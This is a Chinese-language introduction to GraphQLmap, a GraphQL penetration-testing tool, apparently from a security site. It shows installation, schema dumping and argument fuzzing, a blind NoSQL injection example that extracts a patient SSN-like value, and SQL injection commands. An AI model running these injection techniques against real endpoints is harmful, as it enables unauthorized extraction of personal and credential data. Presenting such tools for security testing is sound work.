![](https://image.3001.net/images/20210525/1621897126_60ac2fa68b4908b6065c1.png!small)  

## 关于GraphQLmap

GraphQLmap是一个可以跟GraphQL节点交互的脚本引擎，广大研究人员可以使用GraphQLmap来针对GraphQL节点进行渗透测试和安全研究。

## 工具安装

    
    
    $ git clone https://github.com/swisskyrepo/GraphQLmap
    
    $ python graphqlmap.py                                                              
    
       _____                 _      ____  _                            
    
      / ____|               | |    / __ \| |                           
    
     | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
    
     | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
    
     | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
    
      \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
    
                      | |                                       | |    
    
                      |_|                                       |_|    
    
                                             Author:Swissky Version:1.0
    
    usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]]
    
     
    
    optional arguments:
    
      -h, --help          show this help message and exit
    
      -u URL              URL to query : example.com/graphql?query={}
    
      -v [VERBOSITY]      Enable verbosity
    
      --method [METHOD]   HTTP Method to use interact with /graphql endpoint
    
      --headers [HEADERS] HTTP Headers sent to /graphql endpoint
    
      --json              Send requests using POST and JSON

## 功能和使用样例

### 跟一个GraphQL节点连接

    
    
    python3 graphqlmap.py -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'

### 导出GraphQL架构

使用dump_new导出GraphQL架构，这个功能将会自动使用找到的字段填充"autocomplete"：

    
    
    GraphQLmap > dump_new                     
    
    ============= [SCHEMA] ===============
    
    e.g: name[Type]: arg (Type!)                   
    
                                                                                                   
    
    Query                                          
    
            doctor[]: email (String!),                                                             
    
            doctors[Doctor]:                                                                       
    
            patients[Patient]:                                                                     
    
            patient[]: id (ID!),                   
    
            allrendezvous[Rendezvous]:                                                             
    
            rendezvous[]: id (ID!),                                                                
    
    Doctor                                         
    
            id[ID]:                                                                                
    
            firstName[String]:                     
    
            lastName[String]:                                                                      
    
            specialty[String]:                     
    
            patients[None]:
    
            rendezvous[None]:
    
            email[String]:
    
            password[String]:
    
    [...]

视频演示：【[ _点我观看_](https://asciinema.org/a/14YuWoDOyCztlx7RFykILit4S)】

### 跟一个GraphQL节点交互

编写一个GraphQL请求并执行它：

    
    
    GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
    
    {
    
        "data": {
    
            "doctors": [
    
                {
    
                    "firstName": "Admin",
    
                    "id": "5d089c51dcab2d0032fdd08d",
    
                    "lastName": "Admin"
    
                }
    
            ]
    
        }
    
    }

### GraphQL字段模糊测试

使用GRAPHQL_INCREMENT和GRAPHQL_CHARSET来对参数进行模糊测试：

    
    
    GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi!\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi%\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi)\"} }"){firstName lastName id}}   
    
    [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi*\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi+\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi,\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi-\"} }"){firstName lastName id}}   
    
    [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi.\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi/\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi0\"} }"){firstName lastName id}}   
    
    [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
    
    [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
    
    [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}

视频演示：【[ _点我观看_](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)】

### NoSQLi注入

在请求中使用BLIND_PLACEHOLDER 并实现NoSQLi注入：

    
    
    GraphQLmap > nosqli
    
    Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
    
    Check > 5d089c51dcab2d0032fdd08d
    
    Charset > 0123456789abcdef-    
    [+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
    
    GraphQLmap >

视频演示：【[ _点我观看_](https://asciinema.org/a/wp2lixHqRV0pxxhZ8nsgUj6s7)】

### SQL注入

    
    
    GraphQLmap > postgresqli
    
    GraphQLmap > mysqli
    
    GraphQLmap > mssqli

## 项目地址

 **GraphQLmap：** 【[ _GitHub传送门_](https://github.com/swisskyrepo/GraphQLmap)】

